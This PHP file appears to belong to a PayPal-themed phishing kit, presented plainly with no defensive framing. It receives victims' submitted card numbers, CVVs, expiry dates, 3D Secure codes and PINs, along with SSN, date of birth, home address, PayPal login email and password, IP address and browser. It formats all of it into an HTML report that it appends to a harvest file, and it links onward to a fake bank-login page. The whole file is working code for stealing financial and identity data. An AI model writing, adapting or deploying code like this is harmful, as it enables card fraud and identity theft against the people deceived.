<?

if (! ($_SERVER['REQUEST_METHOD'] === 'POST')) {
     exit;
}
	$_SESSION = $_POST['s'];
unset($_POST['s']);


$Alali = "<pre style='border: 2px solid; border-color: rgb(67, 159, 253);border-radius: 4px;font-weight: bold;font-size: 14px;padding-top: 1.5%;padding-bottom: 2%;'>
  <img src='https://2.bp.blogspot.com/-O-ZJASC706s/U_hvz20oD2I/AAAAAAAAACw/OV1BlsEyjM0/s1600/logo_106x27.png'/>

  <font style='color: rgb(251, 58, 105);'>PP BILLING & CARD:</font>
  <font style='color: rgb(20, 158, 27);'>Add Date CARD:</font> $date       
                                                                                                                                                                                                                                    
   <font style='color: rgb(128, 129, 131);'>&#10112; Card type   :</font>  <font style='color: rgb(235, 79, 60);'> ".$_POST['cc1type']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Card Holder :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['cardholderInput']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10113; Card number :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['cardnumberInput']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Expiration  :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['expirationInput']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10113; Cvv         :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['cardcodeInput']."</font>


   <font style='color: rgb(128, 129, 131);'>&#10112; Card type   :</font>  <font style='color: rgb(235, 79, 60);'> ".$_POST['cc2type']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10113; Card number :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['cardnumber2Input']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Expiration  :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['expiration2Input']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10113; Cvv         :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['cardcode2Input']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; 3D Secure :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['secure_CC2Input']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10113; Card PIN         :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['pin2']."</font>


   <font style='color: rgb(128, 129, 131);'>&#10112; Full Name  :</font>  <font style='color: rgb(65, 66, 68);'> ".$_POST['fullnameInput']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Address line  :</font>  <font style='color: rgb(65, 66, 68);'> ".$_POST['staddressInput']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Country Name  :</font>  <font style='color: rgb(65, 66, 68);'> ".$_POST['countryInput']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; City Name  :</font>  <font style='color: rgb(65, 66, 68);'> ".$_POST['cityInput']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; State line  :</font>  <font style='color: rgb(65, 66, 68);'> ".$_POST['stateInput']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Zip Code  :</font>  <font style='color: rgb(65, 66, 68);'> ".$_POST['postal_codeInput']."</font>
   
   <font style='color: rgb(128, 129, 131);'>&#10112; Social security number :</font>  <font style='color: rgb(65, 66, 68);'> ".$_POST['SSN']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Date of Birth (DD/MM/YYYY)  :</font>  <font style='color: rgb(65, 66, 68);'> ".$_POST['dob']."</font>
   
   <font style='color: rgb(128, 129, 131);'>&#10112; More   :</font>  <font style='color: rgb(60, 118, 235);'> <a href = '/tnt3.html'>Bank login</a></font>

<font style='color:#9c0000;'>℗</font> [PP Email] = <font style='color:#0070ba;'>".$_SESSION['_login_email_']."</font><br>
<font style='color:#9c0000;'>℗</font> [PP Password] = <font style='color:#0070ba;'>".$_SESSION['_login_password_']."</font><br>
   <font style='color: rgb(128, 129, 131);'>&#10114; IP          :</font>  <font style='color: rgb(60, 118, 235);'><a target='_blank' style='text-decoration:none;' href='http://www.geoiptool.com/?IP=".$_POST['REMOTE_ADDR']."'>".$_POST['REMOTE_ADDR']."</a></font><br> 
   <font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>".$_POST['b']." On ".$_POST['os']."</font><br>
   
   ";
   
   
  
  $f = fopen("tnt2.html", "a");
	    fwrite($f, $Alali);
		
		fclose($f);
		
   
   




?>